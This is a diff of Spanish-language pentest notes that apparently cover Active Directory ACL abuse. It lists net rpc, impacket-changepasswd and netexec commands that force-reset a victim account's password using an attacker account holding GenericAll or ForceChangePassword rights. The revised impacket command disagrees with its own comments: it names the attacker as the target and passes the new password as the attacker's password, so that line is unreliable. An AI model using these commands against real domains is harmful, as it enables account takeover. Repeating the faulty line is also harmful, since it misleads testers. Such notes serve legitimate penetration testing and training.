@@ -8,16 +8,29 @@ Tags: #AD #ACL #Linux #Pywhisker #Gettgtpkinit #Net
 ```bash 
 Paso 1:
 ❯ net rpc password "TargetUser" "NewPass123!" -U "domain.corp"/"user"%"passwd" -S IP_DC
-# Requiere ForceChangePassword o GenericAll sobre TargetUser
 # Cambia la contraseña sin conocer la actual
-	# TargetUser = Usuario víctima 
-	# user%passwd = Usuario atacante y su password 
+	# TargetUser     = Usuario víctima (el que quieres cambiar)
+	# user%passwd    = Usuario atacante + su contraseña (quien tiene GenericAll / ForceChangePassword)
+	# IP_DC          = IP del Domain Controller
+	# NewPass123!    = Nueva contraseña que le pones a la víctima
 
 Opción 2 - Más limpio que net rpc en entornos modernos
-❯ impacket-changepasswd domain.corp/targetuser -newpass 'NewPass123!' -authuser user -authpass passwd -dc-ip IP_DC
+❯ impacket-changepasswd 'domain.corp/user@IP_DC' -altuser user -altpass 'NewPass123!' -newpass 'NewPass123!' -reset -dc-ip IP_DC
+
+	# TargetUser@IP_DC = Usuario víctima (el que quieres cambiar)
+	# altuser          = Usuario atacante (quien tiene GenericAll / ForceChangePassword)
+	# altpass          = Contraseña del usuario atacante
+	# newpass          = Nueva contraseña para la víctima
+	# -reset           = Fuerza el cambio sin conocer la contraseña actual
+	# dc-ip            = IP del Domain Controller
 
 Opción 3 - Alternativa con netexec
-❯ nxc smb <IP_DC> -u 'user' -p 'passwd' -M change_password -o USER=targetuser NEWPASS='NewPass123!'
+❯ nxc smb <IP_DC> -u 'user' -p 'passwd' -M change-password -o USER=targetuser NEWPASS='NewPass123!'
+
+	# user / passwd   = Usuario atacante + su contraseña (quien tiene GenericAll / ForceChangePassword)
+	# USER=TargetUser = Usuario víctima (el que quieres cambiar)
+	# NEWPASS         = Nueva contraseña para la víctima
+	# IP_DC           = IP del Domain Controller
 ```
 
 ```bash 
